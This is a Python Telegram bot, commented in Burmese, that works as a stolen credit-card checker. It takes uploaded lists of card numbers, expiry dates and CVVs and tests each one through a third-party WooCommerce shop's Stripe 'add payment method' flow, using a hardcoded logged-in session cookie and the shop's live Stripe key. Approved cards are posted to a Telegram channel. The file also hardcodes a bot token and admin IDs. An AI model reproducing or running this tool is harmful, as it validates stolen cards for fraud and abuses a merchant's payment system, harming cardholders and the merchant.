import aiohttp
import asyncio
import json
import random
import os
import sys
from datetime import datetime
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

# ===================== CONFIGURATION =====================
load_dotenv()

DOMAIN = os.getenv("DOMAIN", "https://dainte.com")
PK = os.getenv("STRIPE_PK", "pk_live_51F0CDkINGBagf8ROVbhXA43bHPn9cGEHEO55TN2mfNGYsbv2DAPuv6K0LoVywNJKNuzFZ4xGw94nVElyYg1Aniaf00QDrdzPhf")
CHANNEL_ID = os.getenv("CHANNEL_ID", "-1003673366048")
ADMIN_IDS = os.getenv("ADMIN_IDS", "1318826936").split(",") if os.getenv("ADMIN_IDS") else []

# Global variables များ
bot_active = True  # Bot စတင်လားမစတင်လား
checking_in_progress = False  # စစ်ဆေးမှုလုပ်နေလား
stop_requested = False  # Stop command ရဲ့လား
current_checking_tasks = []  # လက်ရှိစစ်ဆေးနေတဲ့ task များ
approved_cards_list = []  # Approved cards များ
user_sessions = {}  # လူတစ်ဦးချင်းစီရဲ့ session data

# ===================== FAST CARD CHECKING FUNCTIONS =====================

def parseX(data, start, end):
    """တိုးတက်ထားသော parse function"""
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

async def make_fast_request(
    session,
    url,
    method="POST",
    headers=None,
    data=None,
    timeout=10
):
    """မြန်ဆန်တဲ့ request function"""
    try:
        async with session.request(
            method,
            url,
            headers=headers,
            data=data,
            timeout=aiohttp.ClientTimeout(total=timeout)
        ) as response:
            text = await response.text()
            return text, response.status
    except asyncio.TimeoutError:
        return None, 408  # Timeout
    except Exception as e:
        return None, 0

async def fast_ppc(card_data, card_num, total_cards, user_id=None, username=None):
    """မြန်ဆန်တဲ့ card checking function (1 second/card)"""
    global stop_requested
    
    # Stop requested ဆိုရင် ချက်ချင်းရပ်
    if stop_requested:
        return "🛑 Checking stopped by user"
    
    try:
        cc, mon, year, cvv = card_data.split("|")
    except ValueError:
        return f"❌ [{card_num}/{total_cards}] Invalid format"
    
    year = year[-2:]
    cc = cc.replace(" ", "")
    original_card = f"{cc}|{mon}|{year}|{cvv}"
    
    # Quick validation
    if not (len(cc) >= 13 and len(cc) <= 19):
        return f"❌ [{card_num}/{total_cards}] Invalid card length"
    
    connector = aiohttp.TCPConnector(limit=50, ssl=False)
    
    async with aiohttp.ClientSession(
        connector=connector,
        cookies={
            '_ga': 'GA1.1.1266478631.1765951325',
            'wordpress_logged_in_6d38d63c396edb46dc077c5e4dd298a7': 'ohmyqueenmedusa%7C1766556437%7CzJQumMwlWkTb2WjElYB3ftRAcQcOwxlHPiwELPUvQTD%7C934b3951bd21b3559e879e24c3996e064e00a2f28d57851391e999db0c079d09',
        }
    ) as session:
        
        # STEP 1: Get nonce quickly
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml",
        }
        
        page_html, status = await make_fast_request(
            session,
            f"{DOMAIN}/my-account/add-payment-method/",
            method="GET",
            headers=headers,
            timeout=5
        )
        
        if not page_html or status != 200:
            return f"❌ [{card_num}/{total_cards}] Cannot access page"
        
        setup_intent_nonce = parseX(page_html, '"createAndConfirmSetupIntentNonce":"', '"')
        if not setup_intent_nonce:
            return f"❌ [{card_num}/{total_cards}] No setup nonce"
        
        # STEP 2: Create Stripe payment method (FAST)
        stripe_headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
        }
        
        stripe_data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": year,
            "card[exp_month]": mon,
            "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US",
            "key": PK,
            "_stripe_version": "2024-06-20",
        }
        
        stripe_response, stripe_status = await make_fast_request(
            session,
            "https://api.stripe.com/v1/payment_methods",
            method="POST",
            headers=stripe_headers,
            data=stripe_data,
            timeout=5
        )
        
        if not stripe_response:
            return f"❌ [{card_num}/{total_cards}] Stripe timeout"
        
        try:
            pm_data = json.loads(stripe_response)
            if 'error' in pm_data:
                return f"❌ [{card_num}/{total_cards}] Stripe: {pm_data['error']['message'][:50]}"
            pmid = pm_data.get('id')
            if not pmid:
                return f"❌ [{card_num}/{total_cards}] No payment ID"
        except:
            return f"❌ [{card_num}/{total_cards}] Stripe parse error"
        
        # STEP 3: Final verification (FAST)
        wc_headers = {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
        }
        
        wc_data = {
            "action": "wc_stripe_create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "_ajax_nonce": setup_intent_nonce,
        }
        
        wc_response, wc_status = await make_fast_request(
            session,
            f"{DOMAIN}/wp-admin/admin-ajax.php",
            method="POST",
            headers=wc_headers,
            data=wc_data,
            timeout=5
        )
        
        if stop_requested:
            return "🛑 Checking stopped"
        
        if wc_response:
            try:
                result = json.loads(wc_response)
                if result.get('success'):
                    # ✅ APPROVED - Store for channel
                    card_info = {
                        "card": original_card,
                        "timestamp": datetime.now().strftime("%H:%M:%S"),
                        "username": username,
                        "card_num": card_num,
                        "total_cards": total_cards
                    }
                    
                    global approved_cards_list
                    approved_cards_list.append(card_info)
                    
                    return f"✅ APPROVED [{card_num}/{total_cards}]\n{cc}|{mon}|{year}|{cvv}"
                else:
                    error_msg = "Declined"
                    if 'data' in result and 'error' in result['data']:
                        error_msg = result['data']['error']['message'][:40]
                    return f"❌ DECLINED [{card_num}/{total_cards}]\n{cc}|{mon}|{year}|{cvv}\n{error_msg}"
            except:
                return f"❌ ERROR [{card_num}/{total_cards}]\n{cc}|{mon}|{year}|{cvv}"
        
        return f"❌ NO RESPONSE [{card_num}/{total_cards}]\n{cc}|{mon}|{year}|{cvv}"

# ===================== CHANNEL POSTING =====================

async def fast_post_to_channel(bot: Bot, card_info):
    """မြန်ဆန်စွာ channel ကို post လုပ်ခြင်း"""
    try:
        message = (
            f"✅ NEW APPROVED\n"
            f"💳 `{card_info['card']}`\n"
            f"⏰ {card_info['timestamp']}\n"
            f"👤 @{card_info.get('username', 'User')}"
        )
        
        await bot.send_message(
            chat_id=CHANNEL_ID,
            text=message,
            parse_mode="Markdown"
        )
        return True
    except Exception:
        return False

# ===================== TELEGRAM BOT FUNCTIONS =====================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/start command"""
    global bot_active
    bot_active = True
    
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    
    # Initialize user session
    user_sessions[user_id] = {
        'checking': False,
        'stop_requested': False,
        'username': username
    }
    
    welcome = (
        f"send txt file now"
    )
    
    await update.message.reply_text(welcome)
    print(f"🚀 User @{username} started bot")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/stop command - ချက်ချင်းရပ်မယ်"""
    global stop_requested, checking_in_progress, current_checking_tasks
    
    user_id = update.effective_user.id
    
    # User session ကို update
    if user_id in user_sessions:
        user_sessions[user_id]['stop_requested'] = True
    
    stop_requested = True
    checking_in_progress = False
    
    # လက်ရှိ task အားလုံးကို cancel
    if current_checking_tasks:
        for task in current_checking_tasks:
            if not task.done():
                task.cancel()
        
        # အားလုံးကို စောင့်
        try:
            await asyncio.gather(*current_checking_tasks, return_exceptions=True)
        except:
            pass
        
        current_checking_tasks = []
    
    await update.message.reply_text(
        "🛑 **IMMEDIATE STOP!**\n"
        "Checking stopped immediately.\n"
        "Use /start to begin again."
    )
    print(f"🛑 User {user_id} stopped checking")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/status command"""
    global checking_in_progress, stop_requested, approved_cards_list
    
    status_msg = "🟢 **BOT STATUS**\n\n"
    
    if checking_in_progress and not stop_requested:
        status_msg += "⚡ **CHECKING IN PROGRESS**\n"
    elif stop_requested:
        status_msg += "🛑 **STOPPED BY USER**\n"
    else:
        status_msg += "✅ **READY TO CHECK**\n"
    
    status_msg += f"\n📊 Approved waiting: {len(approved_cards_list)}\n"
    status_msg += f"👥 Active users: {len(user_sessions)}\n"
    
    status_msg += "\n**Commands:**\n"
    status_msg += "/start - Start checking\n"
    status_msg += "/stop - STOP immediately\n"
    status_msg += "/speed - Test speed\n"
    
    await update.message.reply_text(status_msg)

async def speed_test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/speed command - Speed test"""
    await update.message.reply_text("⚡ Testing speed...")
    
    test_card = "4111111111111111|12|2026|123"
    start_time = datetime.now()
    
    try:
        result = await fast_ppc(test_card, 1, 1, update.effective_user.id, "Test")
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()
        
        await update.message.reply_text(
            f"⚡ **SPEED TEST RESULT**\n\n"
            f"⏱️ Time: {duration:.2f} seconds\n"
            f"📊 Speed: {1/duration:.1f} cards/second\n"
            f"✅ Ready for fast checking!"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Speed test failed: {e}")

async def handle_text_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle .txt files with FAST checking"""
    global checking_in_progress, stop_requested, current_checking_tasks, approved_cards_list
    
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    
    # Reset stop flag
    stop_requested = False
    checking_in_progress = True
    
    # User session setup
    user_sessions[user_id] = {
        'checking': True,
        'stop_requested': False,
        'username': username,
        'start_time': datetime.now()
    }
    
    # File validation
    if not update.message.document or not update.message.document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file")
        return
    
    await update.message.reply_text(
        "⚡ **FAST CHECKING STARTED**\n"
        f"👤 User: @{username}\n"
        "⏱️ Speed: ~1 card/second\n\n"
        "🛑 Stop anytime with /stop"
    )
    
    # Download file
    file = await update.message.document.get_file()
    temp_file = f"temp_{user_id}_{datetime.now().timestamp()}.txt"
    await file.download_to_drive(temp_file)
    
    try:
        # Read cards
        with open(temp_file, 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
        
        if not cards:
            await update.message.reply_text("❌ Empty file")
            return
        
        total_cards = len(cards)
        
        # Progress tracking
        approved = 0
        declined = 0
        processed = 0
        
        # Send initial status
        status_msg = await update.message.reply_text(
            f"📊 **PROGRESS**\n"
            f"Total: {total_cards} cards\n"
            f"✅: {approved} | ❌: {declined}\n"
            f"Processed: {processed}/{total_cards}"
        )
        
        bot_instance = context.bot
        tasks = []
        results_batch = []
        batch_size = 10
        
        # Process cards FAST (1 card/second)
        for i, card in enumerate(cards, 1):
            # Check if stop requested
            if stop_requested or user_sessions.get(user_id, {}).get('stop_requested'):
                await update.message.reply_text("🛑 Stopped by user request!")
                break
            
            # Create checking task
            task = asyncio.create_task(
                fast_ppc(card, i, total_cards, user_id, username)
            )
            tasks.append(task)
            current_checking_tasks.append(task)
            
            # Process task immediately
            try:
                result = await asyncio.wait_for(task, timeout=2)
                
                if "✅ APPROVED" in result:
                    approved += 1
                    # Post to channel immediately
                    if approved_cards_list:
                        last_card = approved_cards_list[-1]
                        await fast_post_to_channel(bot_instance, last_card)
                        approved_cards_list.remove(last_card)
                elif "❌" in result or "ERROR" in result:
                    declined += 1
                
                processed = i
                results_batch.append(result)
                
                # Update progress every 5 cards
                if i % 5 == 0:
                    try:
                        await status_msg.edit_text(
                            f"📊 **PROGRESS**\n"
                            f"Total: {total_cards} cards\n"
                            f"✅: {approved} | ❌: {declined}\n"
                            f"Processed: {processed}/{total_cards}\n"
                            f"⏱️ Speed: {i/(datetime.now() - user_sessions[user_id]['start_time']).total_seconds():.1f} cards/sec"
                        )
                    except:
                        pass
                
                # Send results batch
                if i % batch_size == 0:
                    await update.message.reply_text('\n'.join(results_batch[-batch_size:]))
                
                # Delay for 1 second between cards
                if i < total_cards and not stop_requested:
                    await asyncio.sleep(0.8)  # 0.8s delay for ~1 card/second
            
            except asyncio.TimeoutError:
                declined += 1
                results_batch.append(f"❌ TIMEOUT [{i}/{total_cards}]")
            except asyncio.CancelledError:
                await update.message.reply_text("🛑 Task cancelled")
                break
        
        # Final results
        checking_in_progress = False
        
        if not stop_requested:
            # Send remaining results
            if results_batch:
                await update.message.reply_text('\n'.join(results_batch[-batch_size:]))
            
            # Summary
            duration = (datetime.now() - user_sessions[user_id]['start_time']).total_seconds()
            speed = total_cards / duration if duration > 0 else 0
            
            summary = (
                f"🎯 **CHECK COMPLETED**\n\n"
                f"📊 Total cards: {total_cards}\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"⏱️ Time: {duration:.1f}s\n"
                f"⚡ Speed: {speed:.1f} cards/sec\n"
                f"📈 Success rate: {(approved/total_cards*100):.1f}%"
            )
            
            await update.message.reply_text(summary)
        
        # Clean user session
        if user_id in user_sessions:
            user_sessions[user_id]['checking'] = False
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
        checking_in_progress = False
    finally:
        # Cleanup
        if os.path.exists(temp_file):
            os.remove(temp_file)
        
        # Reset checking tasks
        current_checking_tasks = [t for t in current_checking_tasks if not t.done()]

# ===================== MAIN FUNCTION =====================

def main():
    """Start the bot"""
    BOT_TOKEN = "8569583023:AAFNKM3mkumVNrpj9uOZ-32fV3sP3nZ0TSo"
    
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not set!")
        return
    
    print("=" * 50)
    print("⚡ FAST CARD CHECKER BOT")
    print(f"📢 Channel: {CHANNEL_ID}")
    print("⏱️ Speed: 1 card/second")
    print("🛑 /stop works immediately!")
    print("=" * 50)
    
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Commands
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("stop", stop_command))
        app.add_handler(CommandHandler("status", status_command))
        app.add_handler(CommandHandler("speed", speed_test_command))
        
        # File handler
        app.add_handler(MessageHandler(filters.Document.ALL, handle_text_file))
        
        print("✅ Bot is running...")
        print("📋 Commands: /start, /stop, /status, /speed")
        
        app.run_polling()
        
    except Exception as e:
        print(f"❌ Bot error: {e}")

if __name__ == "__main__":
    main()
